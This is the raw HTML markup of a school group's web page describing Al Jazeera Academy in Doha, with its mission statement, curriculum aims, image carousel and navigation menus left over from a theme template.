						<section class="elementor-section elementor-top-section elementor-element elementor-element-a640951 elementor-section-full_width elementor-hidden-tablet elementor-hidden-mobile elementor-section-height-default elementor-section-height-default" data-id="a640951" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
						<div class="elementor-container elementor-column-gap-no">
					<div class="elementor-column elementor-col-50 elementor-top-column elementor-element elementor-element-41080a2" data-id="41080a2" data-element_type="column">
			<div class="elementor-widget-wrap elementor-element-populated">
						<div class="elementor-element elementor-element-16ea61f elementor-widget elementor-widget-text-editor" data-id="16ea61f" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
							<p>Creative learners today, our future leaders tomorrow</p>						</div>
				</div>
					</div>
		</div>
				<div class="elementor-column elementor-col-50 elementor-top-column elementor-element elementor-element-e12b0e8" data-id="e12b0e8" data-element_type="column">
			<div class="elementor-widget-wrap elementor-element-populated">
						<div class="elementor-element elementor-element-7304ebd elementor-widget__width-auto elementor-widget elementor-widget-infetech_elementor_contact_info" data-id="7304ebd" data-element_type="widget" data-widget_type="infetech_elementor_contact_info.default">
				<div class="elementor-widget-container">
						<div class="ova-contact-info template1">
				
													    	<div class="icon">
							<i class="flaticoninfetech- flaticon-infetech-placeholder"></i>
						</div>
								    				
				<div class="contact">
					
					
					<ul class="info">
						
								<li class="item">

									<a href="https://www.google.com/maps/place/BROOKLYN/@40.7155936,-73.9656546,17z/data=!4m5!3m4!1s0x89c259610eb15555:0xea256eb11902f9ce!8m2!3d40.7155316!4d-73.9635083" target="_blank" title="Ta&#039;allum Group PO.Box: 4219, Doha, Qatar">Ta&#039;allum Group PO.Box: 4219, Doha, Qatar</a>								</li>
							
											</ul>

				</div>

			</div>

				</div>
				</div>
				<div class="elementor-element elementor-element-f1f4d67 elementor-widget__width-auto elementor-widget elementor-widget-infetech_elementor_contact_info" data-id="f1f4d67" data-element_type="widget" data-widget_type="infetech_elementor_contact_info.default">
				<div class="elementor-widget-container">
						<div class="ova-contact-info template1">
				
													    	<div class="icon">
							<i class="flaticoninfetech- flaticon-infetech-envelope"></i>
						</div>
								    				
				<div class="contact">
					
					
					<ul class="info">
						
								<li class="item">

									<a href="mailto:info@taalumgroup.com" title="info@taalumgroup.com">info@taalumgroup.com</a>								</li>
							
											</ul>

				</div>

			</div>

				</div>
				</div>
				<div class="elementor-element elementor-element-7f34ecd elementor-widget__width-auto elementor-widget elementor-widget-infetech_elementor_contact_info" data-id="7f34ecd" data-element_type="widget" data-widget_type="infetech_elementor_contact_info.default">
				<div class="elementor-widget-container">
						<div class="ova-contact-info template1">
				
													    	<div class="icon">
							<i class="ovaicon ovaicon-phone-call"></i>
						</div>
								    				
				<div class="contact">
					
					
					<ul class="info">
						
								<li class="item">

									<a href="tel:+97444915410" title="+ 974 4491-5410">+ 974 4491-5410</a>								</li>
							
											</ul>

				</div>

			</div>

				</div>
				</div>
					</div>
		</div>
					</div>
		</section>
				<section class="elementor-section elementor-top-section elementor-element elementor-element-d79e1ec header_sticky mobile_sticky elementor-section-full_width elementor-section-height-default elementor-section-height-default" data-id="d79e1ec" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
						<div class="elementor-container elementor-column-gap-no">
					<div class="elementor-column elementor-col-33 elementor-top-column elementor-element elementor-element-3725b61" data-id="3725b61" data-element_type="column">
			<div class="elementor-widget-wrap elementor-element-populated">
						<div class="elementor-element elementor-element-c8d593f elementor-widget__width-auto elementor-widget elementor-widget-ova_logo" data-id="c8d593f" data-element_type="widget" data-widget_type="ova_logo.default">
				<div class="elementor-widget-container">
			
		<div class="brand_el">

											<a href="https://taalumgroup.com/ "   >
			
				<img src="http://taalumgroup.com/wp-content/uploads/2022/03/logo-1.png" 
					alt="Taallum Education and Training Group" 
					class="logo_desktop" 
					style="width:auto ; height:80px" 
				/>

				<img src="http://taalumgroup.com/wp-content/uploads/2024/12/cropped-Taallum-Logo-icon.jpg" 
					alt="Taallum Education and Training Group" 
					class="logo_mobile" 
					style="width:auto ;  height:41px" 
				/>

				<img src="http://taalumgroup.com/wp-content/uploads/2022/03/logo-1.png" 
					alt="Taallum Education and Training Group" 
					class="logo_sticky" 
					style="width:auto ; height:80px" 
				/>

							</a>
			
		</div>

				</div>
				</div>
					</div>
		</div>
				<div class="elementor-column elementor-col-33 elementor-top-column elementor-element elementor-element-259853a elementor-hidden-tablet elementor-hidden-mobile" data-id="259853a" data-element_type="column">
			<div class="elementor-widget-wrap elementor-element-populated">
						<div class="elementor-element elementor-element-db3ec15 elementor-view-main-nav elementor-widget__width-initial elementor-widget elementor-widget-infetech_elementor_menu_nav" data-id="db3ec15" data-element_type="widget" data-widget_type="infetech_elementor_menu_nav.default">
				<div class="elementor-widget-container">
			
		<nav class="main-navigation">
            <button class="menu-toggle">
            	<span>
            		Menu            	</span>
            </button>
			<div class="primary-navigation"><ul id="menu-main-nav" class="menu"><li id="menu-item-14284" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-home menu-item-14284"><a href="https://taalumgroup.com/">Home</a></li>
<li id="menu-item-13197" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-13197"><a href="#">About</a>
<ul class="sub-menu">
	<li id="menu-item-13067" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-13067"><a href="https://taalumgroup.com/about-us/">Our History</a></li>
	<li id="menu-item-13177" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-13177"><a href="https://taalumgroup.com/mission-and-vision/">Mission and Vision</a></li>
	<li id="menu-item-13196" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-13196"><a href="https://taalumgroup.com/chairmans-message/">Chairman’s Message</a></li>
	<li id="menu-item-13228" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-13228"><a href="https://taalumgroup.com/ceo-message/">CEO’s Message</a></li>
</ul>
</li>
<li id="menu-item-13254" class="menu-item menu-item-type-custom menu-item-object-custom current-menu-ancestor current-menu-parent menu-item-has-children menu-item-13254"><a href="#">Ta&#8217;allum Schools</a>
<ul class="sub-menu">
	<li id="menu-item-13353" class="menu-item menu-item-type-post_type menu-item-object-page current-menu-item page_item page-item-13322 current_page_item menu-item-13353"><a href="https://taalumgroup.com/al-jazeera-academy/" aria-current="page">Al Jazeera Academy</a></li>
	<li id="menu-item-13270" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-13270"><a href="https://taalumgroup.com/al-maha-academy-for-boys/">Al Maha Academy for Boys</a></li>
	<li id="menu-item-13354" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-13354"><a href="https://taalumgroup.com/al-maha-academy-for-girls/">Al Maha Academy for Girls</a></li>
	<li id="menu-item-14680" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-14680"><a href="https://taalumgroup.com/school-curriculum/">School Curriculum</a></li>
	<li id="menu-item-13397" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-13397"><a href="https://taalumgroup.com/school-policies/">School Policies</a></li>
</ul>
</li>
<li id="menu-item-13436" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-13436"><a href="#">News</a>
<ul class="sub-menu">
	<li id="menu-item-14473" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-14473"><a href="https://taalumgroup.com/newsletter/">Newsletter</a></li>
</ul>
</li>
<li id="menu-item-13449" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-13449"><a href="https://taalumgroup.com/our-partners/">Our Partners</a></li>
<li id="menu-item-13469" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-13469"><a href="https://taalumgroup.com/admission/">Admission</a>
<ul class="sub-menu">
	<li id="menu-item-14611" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-14611"><a href="https://taalumgroup.com/online-admission/">Online Admission</a></li>
</ul>
</li>
<li id="menu-item-13475" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-13475"><a href="https://taalumgroup.com/school-calendar/">Calendar</a></li>
<li id="menu-item-14027" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-14027"><a href="https://taalumgroup.com/careers-2/">Careers</a></li>
<li id="menu-item-13032" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-13032"><a href="https://taalumgroup.com/contact/">Contact</a></li>
</ul></div>        </nav>
		

			</div>
				</div>
					</div>
		</div>
				<div class="elementor-column elementor-col-33 elementor-top-column elementor-element elementor-element-e1d312c" data-id="e1d312c" data-element_type="column">
			<div class="elementor-widget-wrap elementor-element-populated">
						<div class="elementor-element elementor-element-b0d849c elementor-widget__width-auto elementor-widget elementor-widget-infetech_elementor_ova_search_popup" data-id="b0d849c" data-element_type="widget" data-widget_type="infetech_elementor_ova_search_popup.default">
				<div class="elementor-widget-container">
			
			<div class="ova_wrap_search_popup">
				<i class="ovaicon ovaicon-search"></i>
				<div class="ova_search_popup">
					<div class="search-popup__overlay"></div>
					<div class="container">
						<form role="search" method="get" class="search-form" action="https://taalumgroup.com/">
						        <input type="search" class="search-field" placeholder="Search …" value="" name="s" title="Search for:" />
				   			 	<button type="submit" class="search-submit">
				   			 		<i class="ovaicon ovaicon-search"></i>
				   			 	</button>
						</form>									
					</div>
				</div>
			</div>

				</div>
				</div>
				<div class="elementor-element elementor-element-4f29e0e elementor-widget__width-auto elementor-hidden-desktop elementor-view-primary-menu elementor-widget elementor-widget-infetech_elementor_menu_canvas" data-id="4f29e0e" data-element_type="widget" data-widget_type="infetech_elementor_menu_canvas.default">
				<div class="elementor-widget-container">
			
		<nav class="menu-canvas">
            <button class="menu-toggle">
            	<span></span>
            </button>
            <nav class="container-menu dir_left" >
	            <div class="close-menu">
	            	<i class="ovaicon-cancel"></i>
	            </div>
				<div class="primary-navigation"><ul id="menu-primary-menu" class="menu"><li id="menu-item-42" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-42"><a href="#">Home</a>
<ul class="sub-menu">
	<li id="menu-item-45" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-home menu-item-45"><a href="https://taalumgroup.com/">Home</a></li>
	<li id="menu-item-46" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-46"><a href="https://taalumgroup.com/?page_id=12703">Home 2</a></li>
	<li id="menu-item-47" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-47"><a href="https://taalumgroup.com/?page_id=12704">Home 3</a></li>
	<li id="menu-item-48" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-48"><a href="https://taalumgroup.com/?page_id=16">Home 4</a></li>
	<li id="menu-item-49" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-49"><a href="https://taalumgroup.com/?page_id=18">Home 5</a></li>
	<li id="menu-item-5581" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-5581"><a href="https://taalumgroup.com/?page_id=5568">Home 6</a></li>
	<li id="menu-item-5596" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-5596"><a href="https://taalumgroup.com/?page_id=5588">Home 7</a></li>
	<li id="menu-item-5595" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-5595"><a href="https://taalumgroup.com/?page_id=5593">Home 8</a></li>
	<li id="menu-item-7878" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-7878"><a href="https://taalumgroup.com/?page_id=7859">Home 9</a></li>
	<li id="menu-item-7877" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-7877"><a href="https://taalumgroup.com/?page_id=7861">Home 10</a></li>
	<li id="menu-item-7876" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-7876"><a href="https://taalumgroup.com/?page_id=7863">Home 11</a></li>
</ul>
</li>
<li id="menu-item-43" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-43"><a href="https://taalumgroup.com/about/">About</a></li>
<li id="menu-item-99" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-99"><a href="#">Pages</a>
<ul class="sub-menu">
	<li id="menu-item-12525" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-12525"><a href="#">Projects</a>
	<ul class="sub-menu">
		<li id="menu-item-4547" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-4547"><a href="https://demo.ovatheme.com/infetech/project/">All Projects</a></li>
		<li id="menu-item-12528" class="menu-item menu-item-type-taxonomy menu-item-object-cat_project menu-item-12528"><a href="https://taalumgroup.com/cat_project/it/">IT Category</a></li>
		<li id="menu-item-12532" class="menu-item menu-item-type-post_type menu-item-object-project menu-item-12532"><a href="https://taalumgroup.com/?post_type=project&#038;p=1009">Project Details</a></li>
	</ul>
</li>
	<li id="menu-item-12529" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-12529"><a href="#">Teams</a>
	<ul class="sub-menu">
		<li id="menu-item-4549" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-4549"><a href="https://demo.ovatheme.com/infetech/team/">All Teams</a></li>
		<li id="menu-item-12530" class="menu-item menu-item-type-taxonomy menu-item-object-cat_team menu-item-12530"><a href="https://taalumgroup.com/cat_team/tech-8/">Tech Category</a></li>
		<li id="menu-item-12531" class="menu-item menu-item-type-post_type menu-item-object-team menu-item-12531"><a href="https://taalumgroup.com/team/christine-eve/">Team Details</a></li>
	</ul>
</li>
	<li id="menu-item-12533" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-12533"><a href="#">Careers</a>
	<ul class="sub-menu">
		<li id="menu-item-12540" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-12540"><a href="https://demo.ovatheme.com/infetech/career/">All Careers</a></li>
		<li id="menu-item-12156" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-12156"><a href="https://taalumgroup.com/?page_id=12057">Career Page</a></li>
		<li id="menu-item-12534" class="menu-item menu-item-type-taxonomy menu-item-object-cat_career menu-item-12534"><a href="https://taalumgroup.com/cat_career/design-creative/">Design Category</a></li>
		<li id="menu-item-12157" class="menu-item menu-item-type-post_type menu-item-object-career menu-item-12157"><a href="https://taalumgroup.com/?post_type=career&#038;p=12154">Career Details</a></li>
	</ul>
</li>
	<li id="menu-item-12551" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-12551"><a href="https://taalumgroup.com/?page_id=12450">Shop</a>
	<ul class="sub-menu">
		<li id="menu-item-12700" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-12700"><a href="https://taalumgroup.com/?page_id=12450">Our Products</a></li>
		<li id="menu-item-12699" class="menu-item menu-item-type-post_type menu-item-object-product menu-item-12699"><a href="https://taalumgroup.com/?post_type=product&#038;p=12706">Product Details</a></li>
		<li id="menu-item-12550" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-12550"><a href="https://taalumgroup.com/?page_id=12451">Cart</a></li>
		<li id="menu-item-12549" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-12549"><a href="https://taalumgroup.com/?page_id=12452">Checkout</a></li>
		<li id="menu-item-12548" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-12548"><a href="https://taalumgroup.com/?page_id=12453">My account</a></li>
	</ul>
</li>
	<li id="menu-item-11953" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-11953"><a href="https://taalumgroup.com/?page_id=11948">FAQ</a></li>
	<li id="menu-item-11314" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-11314"><a href="https://taalumgroup.com/?page_id=11136">Why Choose Us</a></li>
	<li id="menu-item-11947" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-11947"><a href="https://taalumgroup.com/?page_id=11792">Comming Soon</a></li>
	<li id="menu-item-11315" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-11315"><a href="https://demo.ovatheme.com/infetech/404page">404 Page</a></li>
</ul>
</li>
<li id="menu-item-100" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-100"><a href="#">Services</a>
<ul class="sub-menu">
	<li id="menu-item-51" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-51"><a href="https://taalumgroup.com/?page_id=20">Services 1</a></li>
	<li id="menu-item-52" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-52"><a href="https://taalumgroup.com/?page_id=22">Services 2</a></li>
	<li id="menu-item-53" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-53"><a href="https://taalumgroup.com/?page_id=24">Services 3</a></li>
</ul>
</li>
<li id="menu-item-122" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-122"><a href="https://taalumgroup.com/blog/">Blog</a>
<ul class="sub-menu">
	<li id="menu-item-4172" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-4172"><a href="https://taalumgroup.com/blog/">Default</a></li>
	<li id="menu-item-4173" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-4173"><a href="https://demo.ovatheme.com/infetech/blog/?blog_template=grid">Grid Sidebar</a></li>
	<li id="menu-item-4174" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-4174"><a href="https://demo.ovatheme.com/infetech/blog/?blog_template=grid&#038;layout_sidebar=layout_1c">Grid No Sidebar</a></li>
	<li id="menu-item-4175" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-4175"><a href="https://demo.ovatheme.com/infetech/blog/?blog_template=masonry">Masonry Sidebar</a></li>
	<li id="menu-item-4176" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-4176"><a href="https://demo.ovatheme.com/infetech/blog/?blog_template=masonry&#038;&#038;layout_sidebar=layout_1c">Masonry No Sidebar</a></li>
</ul>
</li>
<li id="menu-item-44" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-44"><a href="https://taalumgroup.com/contact/">Contact</a></li>
</ul></div>			</nav>
			<div class="site-overlay"></div>
        </nav>
		

			</div>
				</div>
					</div>
		</div>
					</div>
		</section>
				<section class="elementor-section elementor-top-section elementor-element elementor-element-e34d279 elementor-section-full_width elementor-section-height-default elementor-section-height-default" data-id="e34d279" data-element_type="section">
							<div class="elementor-background-overlay"></div>
							<div class="elementor-container elementor-column-gap-no">
					<div class="elementor-column elementor-col-100 elementor-top-column elementor-element elementor-element-1e035b8" data-id="1e035b8" data-element_type="column">
			<div class="elementor-widget-wrap elementor-element-populated">
						<div class="elementor-element elementor-element-7c21770 elementor-widget elementor-widget-infetech_elementor_header_banner" data-id="7c21770" data-element_type="widget" data-widget_type="infetech_elementor_header_banner.default">
				<div class="elementor-widget-container">
					 	<!-- Display when you choose background per Post -->
		 	<div class="wrap_header_banner   "  >

		 					 	
				 	<div class="cover_color"></div>

					<div class="header_banner_el ">
						
													
							
														<h1 class=" header_title">
								Al Jazeera Academy							</h1>
								
						

													<div class="header_breadcrumbs">
								<div id="breadcrumbs"><ul class="breadcrumb"><li><a href="https://taalumgroup.com/" title="Home">Home</a></li> <li class="li_separator"><span class="separator"><i class="ovaicon-next"></i></span></li><li>Al Jazeera Academy</li></ul></div>							</div>
						
					</div>

				
			</div>
				</div>
				</div>
					</div>
		</div>
					</div>
		</section>
				</div>
				<div data-elementor-type="wp-page" data-elementor-id="13322" class="elementor elementor-13322" data-elementor-post-type="page">
						<section class="elementor-section elementor-top-section elementor-element elementor-element-c85d6a7 elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="c85d6a7" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
							<div class="elementor-background-overlay"></div>
							<div class="elementor-container elementor-column-gap-default">
					<div class="elementor-column elementor-col-50 elementor-top-column elementor-element elementor-element-91620cf" data-id="91620cf" data-element_type="column" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
			<div class="elementor-widget-wrap elementor-element-populated">
						<div class="elementor-element elementor-element-e1e7877 elementor-widget elementor-widget-infetech_elementor_heading" data-id="e1e7877" data-element_type="widget" data-widget_type="infetech_elementor_heading.default">
				<div class="elementor-widget-container">
			
			<div class="ova-heading">
				
									<h2 class="sub-title">
						<span class="underlined"></span>
						Overview					</h2>	
				
				
					<h3 class="title">													Al Jazeera Academy											</h3>
                
                					<p class="description">“We are committed to providing high quality education to raise a generation of continuous learners who are dedicated to the community and have high moral Islamic values and strong leadership skills”.

‘An excellent internationally recognized education with Islamic identity’.

Every child has the potential to succeed and there are no excuses not to achieve that success. We expect every Al Jazeera student to graduate from our academy with the qualifications, skills and confidence to achieve their ambitions and go on to higher education or their chosen career. Our students are Creative learners today and the future leaders of tomorrow!</p>
				
			</div>

				</div>
				</div>
				<div class="elementor-element elementor-element-efc4bad elementor-widget elementor-widget-button" data-id="efc4bad" data-element_type="widget" data-widget_type="button.default">
				<div class="elementor-widget-container">
							<div class="elementor-button-wrapper">
					<a class="elementor-button elementor-button-link elementor-size-sm elementor-animation-float" href="https://aja.edu.qa" target="_blank">
						<span class="elementor-button-content-wrapper">
									<span class="elementor-button-text">Visit School Website</span>
					</span>
					</a>
				</div>
						</div>
				</div>
					</div>
		</div>
				<div class="elementor-column elementor-col-50 elementor-top-column elementor-element elementor-element-3a461bd" data-id="3a461bd" data-element_type="column" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
			<div class="elementor-widget-wrap elementor-element-populated">
					<div class="elementor-background-overlay"></div>
						<div class="elementor-element elementor-element-da30fbe elementor-widget elementor-widget-image" data-id="da30fbe" data-element_type="widget" data-widget_type="image.default">
				<div class="elementor-widget-container">
													<img fetchpriority="high" decoding="async" width="2560" height="1431" src="https://taalumgroup.com/wp-content/uploads/2024/12/Screen-Shot-2021-01-26-at-10.40.24-AM-copy-2-scaled.jpg" class="attachment-full size-full wp-image-13329" alt="" srcset="https://taalumgroup.com/wp-content/uploads/2024/12/Screen-Shot-2021-01-26-at-10.40.24-AM-copy-2-scaled.jpg 2560w, https://taalumgroup.com/wp-content/uploads/2024/12/Screen-Shot-2021-01-26-at-10.40.24-AM-copy-2-300x168.jpg 300w, https://taalumgroup.com/wp-content/uploads/2024/12/Screen-Shot-2021-01-26-at-10.40.24-AM-copy-2-scaled-600x335.jpg 600w, https://taalumgroup.com/wp-content/uploads/2024/12/Screen-Shot-2021-01-26-at-10.40.24-AM-copy-2-1024x573.jpg 1024w, https://taalumgroup.com/wp-content/uploads/2024/12/Screen-Shot-2021-01-26-at-10.40.24-AM-copy-2-768x429.jpg 768w, https://taalumgroup.com/wp-content/uploads/2024/12/Screen-Shot-2021-01-26-at-10.40.24-AM-copy-2-1536x859.jpg 1536w, https://taalumgroup.com/wp-content/uploads/2024/12/Screen-Shot-2021-01-26-at-10.40.24-AM-copy-2-2048x1145.jpg 2048w" sizes="(max-width: 2560px) 100vw, 2560px" />													</div>
				</div>
					</div>
		</div>
					</div>
		</section>
				<section class="elementor-section elementor-top-section elementor-element elementor-element-eff3391 elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="eff3391" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
							<div class="elementor-background-overlay"></div>
							<div class="elementor-container elementor-column-gap-default">
					<div class="elementor-column elementor-col-50 elementor-top-column elementor-element elementor-element-628d86f" data-id="628d86f" data-element_type="column" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
			<div class="elementor-widget-wrap elementor-element-populated">
					<div class="elementor-background-overlay"></div>
						<div class="elementor-element elementor-element-77798b7 elementor-skin-slideshow elementor-arrows-yes elementor-widget elementor-widget-media-carousel" data-id="77798b7" data-element_type="widget" data-settings="{&quot;skin&quot;:&quot;slideshow&quot;,&quot;effect&quot;:&quot;slide&quot;,&quot;show_arrows&quot;:&quot;yes&quot;,&quot;speed&quot;:500,&quot;autoplay&quot;:&quot;yes&quot;,&quot;autoplay_speed&quot;:5000,&quot;loop&quot;:&quot;yes&quot;,&quot;pause_on_hover&quot;:&quot;yes&quot;,&quot;pause_on_interaction&quot;:&quot;yes&quot;,&quot;space_between&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:10,&quot;sizes&quot;:[]},&quot;space_between_tablet&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:10,&quot;sizes&quot;:[]},&quot;space_between_mobile&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:10,&quot;sizes&quot;:[]}}" data-widget_type="media-carousel.default">
				<div class="elementor-widget-container">
					<div class="elementor-swiper">
			<div class="elementor-main-swiper swiper">
				<div class="swiper-wrapper">
											<div class="swiper-slide">
									<div class="elementor-carousel-image" role="img" aria-label="Screenshot" style="background-image: url(&#039;https://taalumgroup.com/wp-content/uploads/2024/12/Screen-Shot-2021-01-26-at-10.40.24-AM-copy-2-scaled.jpg&#039;)">

			
					</div>
								</div>
											<div class="swiper-slide">
									<div class="elementor-carousel-image" role="img" aria-label="img_slider_aljazeera" style="background-image: url(&#039;https://taalumgroup.com/wp-content/uploads/2024/12/img_slider_aljazeera.jpg&#039;)">

			
					</div>
								</div>
											<div class="swiper-slide">
									<div class="elementor-carousel-image" role="img" aria-label="NKN_4318" style="background-image: url(&#039;https://taalumgroup.com/wp-content/uploads/2024/12/NKN_4318-scaled.jpg&#039;)">

			
					</div>
								</div>
											<div class="swiper-slide">
									<div class="elementor-carousel-image" role="img" aria-label="DSC08880" style="background-image: url(&#039;https://taalumgroup.com/wp-content/uploads/2024/12/DSC08880-scaled.jpg&#039;)">

			
					</div>
								</div>
											<div class="swiper-slide">
									<div class="elementor-carousel-image" role="img" aria-label="NKN_0790" style="background-image: url(&#039;https://taalumgroup.com/wp-content/uploads/2024/12/NKN_0790-scaled.jpg&#039;)">

			
					</div>
								</div>
									</div>
																				<div class="elementor-swiper-button elementor-swiper-button-prev" role="button" tabindex="0">
							<svg aria-hidden="true" class="e-font-icon-svg e-eicon-chevron-left" viewBox="0 0 1000 1000" xmlns="http://www.w3.org/2000/svg"><path d="M646 125C629 125 613 133 604 142L308 442C296 454 292 471 292 487 292 504 296 521 308 533L604 854C617 867 629 875 646 875 663 875 679 871 692 858 704 846 713 829 713 812 713 796 708 779 692 767L438 487 692 225C700 217 708 204 708 187 708 171 704 154 692 142 675 129 663 125 646 125Z"></path></svg>							<span class="elementor-screen-only">Previous</span>
						</div>
						<div class="elementor-swiper-button elementor-swiper-button-next" role="button" tabindex="0">
							<svg aria-hidden="true" class="e-font-icon-svg e-eicon-chevron-right" viewBox="0 0 1000 1000" xmlns="http://www.w3.org/2000/svg"><path d="M696 533C708 521 713 504 713 487 713 471 708 454 696 446L400 146C388 133 375 125 354 125 338 125 325 129 313 142 300 154 292 171 292 187 292 204 296 221 308 233L563 492 304 771C292 783 288 800 288 817 288 833 296 850 308 863 321 871 338 875 354 875 371 875 388 867 400 854L696 533Z"></path></svg>							<span class="elementor-screen-only">Next</span>
						</div>
												</div>
		</div>
				<div class="elementor-swiper">
			<div class="elementor-thumbnails-swiper swiper">
				<div class="swiper-wrapper">
											<div class="swiper-slide">
									<div class="elementor-carousel-image" role="img" aria-label="Screenshot" style="background-image: url(&#039;https://taalumgroup.com/wp-content/uploads/2024/12/Screen-Shot-2021-01-26-at-10.40.24-AM-copy-2-scaled.jpg&#039;)">

			
					</div>
								</div>
											<div class="swiper-slide">
									<div class="elementor-carousel-image" role="img" aria-label="img_slider_aljazeera" style="background-image: url(&#039;https://taalumgroup.com/wp-content/uploads/2024/12/img_slider_aljazeera.jpg&#039;)">

			
					</div>
								</div>
											<div class="swiper-slide">
									<div class="elementor-carousel-image" role="img" aria-label="NKN_4318" style="background-image: url(&#039;https://taalumgroup.com/wp-content/uploads/2024/12/NKN_4318-scaled.jpg&#039;)">

			
					</div>
								</div>
											<div class="swiper-slide">
									<div class="elementor-carousel-image" role="img" aria-label="DSC08880" style="background-image: url(&#039;https://taalumgroup.com/wp-content/uploads/2024/12/DSC08880-scaled.jpg&#039;)">

			
					</div>
								</div>
											<div class="swiper-slide">
									<div class="elementor-carousel-image" role="img" aria-label="NKN_0790" style="background-image: url(&#039;https://taalumgroup.com/wp-content/uploads/2024/12/NKN_0790-scaled.jpg&#039;)">

			
					</div>
								</div>
									</div>
																					</div>
		</div>
				</div>
				</div>
					</div>
		</div>
				<div class="elementor-column elementor-col-50 elementor-top-column elementor-element elementor-element-cf73b51" data-id="cf73b51" data-element_type="column" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
			<div class="elementor-widget-wrap elementor-element-populated">
						<div class="elementor-element elementor-element-4baa734 elementor-widget elementor-widget-infetech_elementor_heading" data-id="4baa734" data-element_type="widget" data-widget_type="infetech_elementor_heading.default">
				<div class="elementor-widget-container">
			
			<div class="ova-heading">
				
				
				
					<h3 class="title">													Curriculum Aims											</h3>
                
                					<p class="description">To offer a broad, balanced, challenging curriculum that, as well as fulfilling the National Curriculum, develops confidence, aesthetic awareness, sense of fair-play, sound moral values and self-esteem.

To provide first hand experiences that encourage the pupil to question, investigate and seek solutions.

To develop a home/school partnership as a basis for successful education in which the parents share responsibilities with the school and play a major part as co-educators of their child.

To develop the child’s confidence, self-knowledge, skills and attitudes towards learning which will enable him/her to grow towards being a caring, responsible member of the wider community.

To enhance our pupils’ awareness and appreciation of cultures, including their own. The intellectually challenging academic dual-curriculum ensures that our cultural considerations are integral to all that is taught in all subject areas. Students will be educated to the highest standards in a warm, friendly, secure and conservative environment. The environmental conditions to learning are further achieved by the school’s healthy and balanced emphasis on discipline and fostering respect by all, for all.</p>
				
			</div>

				</div>
				</div>
					</div>
		</div>
					</div>
		</section>
				</div>
					</div>
			<div class="wrap_footer">
						<div data-elementor-type="wp-post" data-elementor-id="13042" class="elementor elementor-13042" data-elementor-post-type="ova_framework_hf_el">
						<section class="elementor-section elementor-top-section elementor-element elementor-element-99d5170 elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="99d5170" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
							<div class="elementor-background-overlay"></div>
							<div class="elementor-container elementor-column-gap-default">
